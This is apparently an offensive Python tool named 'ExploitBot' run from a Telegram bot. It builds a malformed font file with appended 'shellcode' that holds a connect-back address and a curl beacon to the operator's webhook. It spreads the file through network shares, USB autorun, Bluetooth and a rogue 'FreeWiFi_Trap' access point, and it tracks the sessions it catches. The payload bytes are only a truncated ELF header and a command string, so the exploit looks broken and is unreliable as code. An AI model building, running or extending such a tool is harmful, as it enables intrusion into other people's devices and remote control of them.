import os
import time
import logging
import socket
import struct
import asyncio
import netifaces
import subprocess
from threading import Thread
from flask import Flask, request
from fonttools.ttLib import TTFont
import requests
import aiohttp
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')
REPLIT_URL = os.getenv('REPLIT_URL', 'http://localhost:5000')
LISTENER_PORT = 4444
FONT_SOURCE = 'a.ttf'
FONT_OUT = 'malicious_font.ttf'

# Global variables
targets = {}
active_sessions = {}
telegram_bot = None
app = Flask(__name__)

# Get public IP
def get_replit_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except Exception as e:
        logger.error(f"Failed to get public IP: {e}")
        return '127.0.0.1'

PUBLIC_IP = get_replit_ip()

# Craft malicious font
def craft_malicious_font(attacker_ip, attacker_port, target_type):
    try:
        font = TTFont(FONT_SOURCE)
        font.saveXML('rf.xml')
        with open('rf.xml', 'r') as f:
            indata = f.readlines()
        for i in range(len(indata)):
            if '<TTGlyph name="uni0025"' in indata[i]:
                theoff = i
                break
        newchar = '      <component glyphName="uni0020" x="747" y="0" flags="0x4"/>\n'
        outdata = indata[0:theoff + 1] + [newchar]*(0xfffd - 3) + indata[theoff+1:]
        with open('rf2.xml', 'w') as f:
            f.writelines(outdata)
        font = TTFont()
        font.importXML('rf2.xml')
        font.save(FONT_OUT)
        shellcode = craft_payload(attacker_ip, attacker_port, target_type)
        with open(FONT_OUT, 'ab') as f:
            f.write(shellcode)
        return FONT_OUT
    except Exception as e:
        logger.error(f"Font generation failed: {e}")
        return None

# Craft payload with webhook notification
def craft_payload(ip, port, target_type):
    try:
        connection_data = (
            b"\x02\x00" + struct.pack(">H", port) +
            socket.inet_aton(ip) + b"\x00" * 8
        )
        webhook_url = f"{REPLIT_URL}/webhook"
        session_id = f"session_{int(time.time())}"
        webhook_payload = (
            f'curl -X POST -d \'{{"session_id":"{session_id}","status":"connected"}}\' {webhook_url}'
        ).encode()
        shellcode = (
            b"\x7f\x45\x4c\x46\x02\x01\x01\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x02\x00\xb7\x00\x01\x00\x00\x00"
            b"\x78\x00\x40\x00\x00\x00\x00\x00"
            + connection_data + webhook_payload
        )
        return shellcode
    except Exception as e:
        logger.error(f"Payload creation failed: {e}")
        return b""

# Smart delivery methods
def drop_to_network_shares(font_path):
    try:
        subprocess.run(['cp', font_path, '/tmp/share/'], check=True)
        return "Network shares configured"
    except Exception as e:
        logger.error(f"Network share drop failed: {e}")
        return "Network share drop failed"

def create_usb_autorun(font_path):
    try:
        with open('/tmp/autorun.inf', 'w') as f:
            f.write(f"[AutoRun]\nopen={font_path}")
        return "USB autorun configured"
    except Exception as e:
        logger.error(f"USB autorun failed: {e}")
        return "USB autorun failed"

def setup_bluetooth_beacon(font_path):
    try:
        subprocess.run(['hciconfig', 'hci0', 'piscan'], check=True)
        return "Bluetooth beacon active"
    except Exception as e:
        logger.error(f"Bluetooth beacon failed: {e}")
        return "Bluetooth beacon failed"

def create_wifi_trap(font_path):
    try:
        subprocess.run(['airbase-ng', '-e', 'FreeWiFi_Trap', 'wlan0'], check=True)
        return "WiFi trap configured"
    except Exception as e:
        logger.error(f"WiFi trap failed: {e}")
        return "WiFi trap failed"

def smart_payload_delivery(font_path):
    results = []
    results.append(drop_to_network_shares(font_path))
    results.append(create_usb_autorun(font_path))
    results.append(setup_bluetooth_beacon(font_path))
    results.append(create_wifi_trap(font_path))
    return results

# Auto-fetch targets
def auto_fetch_targets():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        targets[f"auto_{default_gateway}_4444"] = {
            "ip": default_gateway,
            "port": 4444,
            "device_id": f"auto_{default_gateway}_4444",
            "type": "auto_discovered",
            "status": "pending"
        }
        targets[f"auto_10_0_0_50_5555"] = {
            "ip": "10.0.0.50",
            "port": 5555,
            "device_id": f"auto_10_0_0_50_5555",
            "type": "auto_discovered",
            "status": "pending"
        }
        return len(targets)
    except Exception as e:
        logger.error(f"Auto-discovery failed: {e}")
        return 0

# Flask endpoints
@app.route('/')
def index():
    return {
        "service": "ExploitBot",
        "version": "2.1",
        "endpoints": ["/health", "/webhook"],
        "targets": len(targets),
        "sessions": len(active_sessions)
    }

@app.route('/health')
def health():
    return {
        "status": "running",
        "active_sessions": len(active_sessions),
        "targets": len(targets),
        "bot_status": "active" if telegram_bot else "inactive"
    }

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if not data:
        return "No data", 400
    session_id = data.get('session_id')
    status = data.get('status')
    if session_id and status == "connected":
        active_sessions[session_id] = {
            "status": "active",
            "last_seen": time.strftime("%H:%M:%S")
        }
        if telegram_bot:
            asyncio.create_task(
                telegram_bot.send_message(
                    int(ADMIN_CHAT_ID),
                    f"🔥 New session connected: `{session_id}`"
                )
            )
    return "OK", 200

# Telegram Bot
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.url = f"https://api.telegram.org/bot{token}"
        self.last_update_id = 0

    async def send_message(self, chat_id, text, reply_markup=None):
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown",
            "reply_markup": reply_markup
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(f"{self.url}/sendMessage", json=payload) as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Failed to send message: {e}")

    async def send_document(self, chat_id, document_path):
        try:
            async with aiohttp.ClientSession() as session:
                with open(document_path, 'rb') as f:
                    data = aiohttp.FormData()
                    data.add_field('chat_id', str(chat_id))
                    data.add_field('document', f, filename=document_path)
                    async with session.post(f"{self.url}/sendDocument", data=data) as response:
                        return await response.json()
        except Exception as e:
            logger.error(f"Failed to send document: {e}")

    async def get_updates(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.url}/getUpdates?offset={self.last_update_id+1}") as response:
                    data = await response.json()
                    if data['ok']:
                        updates = data['result']
                        if updates:
                            self.last_update_id = updates[-1]['update_id']
                        return updates
        except Exception as e:
            logger.error(f"Failed to get updates: {e}")
            return []

    async def handle_updates(self):
        while True:
            updates = await self.get_updates()
            for update in updates:
                if 'message' in update:
                    message = update['message']
                    chat_id = message['chat']['id']
                    if str(chat_id) != ADMIN_CHAT_ID:
                        continue
                    text = message.get('text', '')
                    if text.startswith('/start'):
                        await self.send_message(chat_id, (
                            f"🔒 *ExploitBot Admin Panel*\n"
                            f"• Replit URL: `{REPLIT_URL}`\n"
                            f"• Listener Port: `{LISTENER_PORT}`\n"
                            f"• Active Targets: `{len(targets)}`\n"
                            f"• Active Sessions: `{len(active_sessions)}`\n"
                            f"Select an option:"
                        ), {
                            "inline_keyboard": [
                                [{"text": "Add Target", "callback_data": "add_target"}],
                                [{"text": "List Targets", "callback_data": "list_targets"}],
                                [{"text": "Generate Font", "callback_data": "generate_font"}],
                                [{"text": "Push Font", "callback_data": "push_font"}],
                                [{"text": "Smart Delivery", "callback_data": "smart_delivery"}],
                                [{"text": "Sessions", "callback_data": "sessions"}],
                                [{"text": "Restart", "callback_data": "restart"}],
                                [{"text": "Status", "callback_data": "status"}],
                                [{"text": "Clear Targets", "callback_data": "clear_targets"}]
                            ]
                        })
                    elif text.startswith('/target'):
                        parts = text.split()
                        if len(parts) != 3:
                            await self.send_message(chat_id, "Usage: /target <IP> <PORT>")
                            continue
                        ip, port = parts[1], parts[2]
                        try:
                            port = int(port)
                            device_id = f"manual_{int(time.time())}"
                            targets[device_id] = {
                                "ip": ip,
                                "port": port,
                                "device_id": device_id,
                                "type": "manual",
                                "status": "pending"
                            }
                            await self.send_message(chat_id, f"✅ Target added: `{ip}:{port}` Device ID: `{device_id}`")
                        except ValueError:
                            await self.send_message(chat_id, "Invalid port")
                    elif text.startswith('/status'):
                        await self.send_message(chat_id, (
                            f"📊 *Server Status*\n"
                            f"🌐 Public IP: `{PUBLIC_IP}`\n"
                            f"🗳 Replit URL: `{REPLIT_URL}`\n"
                            f"🚪 Listener Port: `{LISTENER_PORT}`\n"
                            f"🎯 Targets: `{len(targets)}`\n"
                            f"💻 Sessions: `{len(active_sessions)}`\n"
                            f"⏱️ Uptime: `{int(time.time() - start_time)} seconds`\n"
                            f"🤖 Bot Status: `Running`"
                        ))
                    elif text.startswith('/sessions'):
                        if not active_sessions:
                            await self.send_message(chat_id, "💻 *No active sessions*")
                        else:
                            msg = "💻 *Active Sessions*\n"
                            for sid, info in active_sessions.items():
                                msg += f"🟢 `{sid}`\n   ⏰ Last seen: `{info['last_seen']}`\n   📊 Status: `{info['status']}`\n"
                            await self.send_message(chat_id, msg)
                    elif text.startswith('/help'):
                        await self.send_message(chat_id, (
                            "📜 *ExploitBot Commands*\n"
                            "`/start` - Start the bot\n"
                            "`/target <IP> <PORT>` - Add a target\n"
                            "`/status` - Server status\n"
                            "`/sessions` - List active sessions\n"
                            "`/help` - Show this help\n"
                            "Inline buttons:\n"
                            "- Add Target\n- List Targets\n- Generate Font\n- Push Font\n- Smart Delivery\n- Sessions\n- Restart\n- Status\n- Clear Targets\n"
                            "Quick add: Send `IP:PORT` or `IP:PORT:DEVICE_ID`"
                        ))
                    elif ':' in text:
                        parts = text.split(':')
                        if len(parts) in [2, 3]:
                            ip, port = parts[0], parts[1]
                            device_id = parts[2] if len(parts) == 3 else f"text_{int(time.time())}"
                            try:
                                port = int(port)
                                targets[device_id] = {
                                    "ip": ip,
                                    "port": port,
                                    "device_id": device_id,
                                    "type": "text",
                                    "status": "pending"
                                }
                                await self.send_message(chat_id, f"✅ Target added: `{ip}:{port}` Device ID: `{device_id}`")
                            except ValueError:
                                await self.send_message(chat_id, "Invalid port")
                elif 'callback_query' in update:
                    callback = update['callback_query']
                    chat_id = callback['message']['chat']['id']
                    if str(chat_id) != ADMIN_CHAT_ID:
                        continue
                    data = callback['data']
                    if data == "add_target":
                        await self.send_message(chat_id, "Send target as `/target <IP> <PORT>` or `IP:PORT`")
                    elif data == "list_targets":
                        if not targets:
                            await self.send_message(chat_id, "🎯 *No targets*")
                        else:
                            msg = "🎯 *Targets*\n"
                            for tid, info in targets.items():
                                msg += f"🟢 `{tid}`\n   📍 `{info['ip']}:{info['port']}`\n   📊 Type: `{info['type']}`\n"
                            await self.send_message(chat_id, msg)
                    elif data == "generate_font":
                        if not targets:
                            await self.send_message(chat_id, "🎯 *No targets to generate fonts for*")
                        else:
                            await self.send_message(chat_id, "🛠️ *Font Generation*\nGenerating fonts for all targets...")
                            for tid, info in targets.items():
                                font_path = craft_malicious_font(info['ip'], info['port'], info['type'])
                                if font_path:
                                    await self.send_document(chat_id, font_path)
                                    await self.send_message(chat_id, f"✅ `{tid}` - Generated")
                            await self.send_message(chat_id, f"📊 Generated: `{len(targets)}/{len(targets)}` fonts")
                    elif data == "push_font":
                        await self.send_message(chat_id, (
                            f"📤 *Font Push Status*\n"
                            f"📍 `{len(targets)}` targets ready for push\n"
                            f"💡 Fonts will be delivered via smart delivery methods"
                        ), {
                            "inline_keyboard": [[{"text": "Execute Push", "callback_data": "execute_push"}]]
                        })
                    elif data == "execute_push":
                        if not targets:
                            await self.send_message(chat_id, "🎯 *No targets to push fonts to*")
                        else:
                            await self.send_message(chat_id, "🚀 *Initiating Smart Delivery...*")
                            for tid, info in targets.items():
                                font_path = f"font_{tid}.ttf"
                                if not os.path.exists(font_path):
                                    font_path = craft_malicious_font(info['ip'], info['port'], info['type'])
                                if font_path:
                                    results = smart_payload_delivery(font_path)
                                    msg = f"📡 *Smart Delivery Results*\n"
                                    for result in results:
                                        msg += f"✅ {result}\n"
                                    await self.send_message(chat_id, msg)
                    elif data == "smart_delivery":
                        await self.send_message(chat_id, "🚀 *Initiating Smart Delivery...*")
                        for tid, info in targets.items():
                            font_path = f"font_{tid}.ttf"
                            if not os.path.exists(font_path):
                                font_path = craft_malicious_font(info['ip'], info['port'], info['type'])
                            if font_path:
                                results = smart_payload_delivery(font_path)
                                msg = f"📡 *Smart Delivery Results*\n"
                                for result in results:
                                    msg += f"✅ {result}\n"
                                await self.send_message(chat_id, msg)
                    elif data == "sessions":
                        if not active_sessions:
                            await self.send_message(chat_id, "💻 *No active sessions*")
                        else:
                            msg = "💻 *Active Sessions*\n"
                            for sid, info in active_sessions.items():
                                msg += f"🟢 `{sid}`\n   ⏰ Last seen: `{info['last_seen']}`\n   📊 Status: `{info['status']}`\n"
                            await self.send_message(chat_id, msg)
                    elif data == "restart":
                        active_sessions.clear()
                        await self.send_message(chat_id, "🔄 *Listener Restarted*")
                    elif data == "status":
                        await self.send_message(chat_id, (
                            f"📊 *Server Status*\n"
                            f"🌐 Public IP: `{PUBLIC_IP}`\n"
                            f"🗳 Replit URL: `{REPLIT_URL}`\n"
                            f"🚪 Listener Port: `{LISTENER_PORT}`\n"
                            f"🎯 Targets: `{len(targets)}`\n"
                            f"💻 Sessions: `{len(active_sessions)}`\n"
                            f"⏱️ Uptime: `{int(time.time() - start_time)} seconds`\n"
                            f"🤖 Bot Status: `Running`"
                        ))
                    elif data == "clear_targets":
                        count = len(targets)
                        targets.clear()
                        await self.send_message(chat_id, f"✅ Cleared `{count}` targets")
            await asyncio.sleep(1)

# Start Flask server
def start_flask():
    app.run(host='0.0.0.0', port=5000)

# Main
if __name__ == "__main__":
    start_time = time.time()
    logger.info("Starting ExploitBot v2.1")
    logger.info(f"Replit Public IP: {PUBLIC_IP}")
    logger.info(f"Admin Chat ID: {ADMIN_CHAT_ID}")
    logger.info(f"Telegram Token: {TELEGRAM_TOKEN[:5]}...{TELEGRAM_TOKEN[-5:]}")

    flask_thread = Thread(target=start_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask server started on port 5000")

    telegram_bot = TelegramBot(TELEGRAM_TOKEN)
    logger.info("Telegram bot started")

    asyncio.run(telegram_bot.handle_updates())